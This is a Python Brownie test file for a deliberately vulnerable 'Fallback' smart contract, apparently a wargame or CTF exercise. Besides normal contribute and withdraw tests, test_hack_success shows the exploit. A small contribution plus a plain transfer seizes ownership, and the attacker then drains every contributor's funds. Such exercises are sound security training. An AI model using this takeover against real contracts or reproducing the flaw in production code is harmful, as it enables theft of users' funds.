from brownie import reverts, accounts, exceptions

from scripts.deploy import deploy_fallback_contract


def test_contribute_success():
    # Arrange
    fallback_contract = deploy_fallback_contract()
    # Act
    fallback_contract.contribute({"from": accounts[1], "value": 999999})
    # Assert
    assert fallback_contract.getContribution({"from": accounts[1]}) == 999999
    assert fallback_contract.balance() == 999999
    assert fallback_contract.owner() == accounts[0]


def test_withdraw_fail():
    # Arrange
    fallback_contract = deploy_fallback_contract()
    # Act
    fallback_contract.contribute({"from": accounts[1], "value": 999999})
    # Assert
    assert fallback_contract.getContribution({"from": accounts[1]}) == 999999
    assert fallback_contract.balance() == 999999
    assert fallback_contract.owner() == accounts[0]
    with reverts():
        fallback_contract.withdraw({"from": accounts[1]})
    assert fallback_contract.balance() == 999999
    fallback_contract.withdraw({"from": accounts[0]})
    assert fallback_contract.balance() == 0


### The sad Fallback contract doesn't even require an attack contract to pwn.  just a simple transfer.  L4m3rz.
def test_hack_success():
    # Arrange
    attacker = accounts[3]
    fallback_contract = deploy_fallback_contract()
    # Act 1 - Fund from multiple wallets
    fallback_contract.contribute({"from": accounts[0], "value": 999999})
    fallback_contract.contribute({"from": accounts[1], "value": 999999})
    fallback_contract.contribute({"from": accounts[2], "value": 999999})
    fallback_contract.contribute({"from": attacker, "value": 11})

    # Assert 1
    assert fallback_contract.getContribution({"from": accounts[1]}) == 999999
    assert fallback_contract.balance() == 3000008
    assert fallback_contract.owner() == accounts[0]
    with reverts():
        fallback_contract.withdraw({"from": accounts[1]})
    assert fallback_contract.balance() == 3000008
    # Act 2 - Attack
    attacker.transfer(fallback_contract, 1)
    # Assert 2
    assert fallback_contract.balance() == 3000009
    assert fallback_contract.owner() == attacker
    fallback_contract.withdraw({"from": attacker})
    assert fallback_contract.balance() == 0
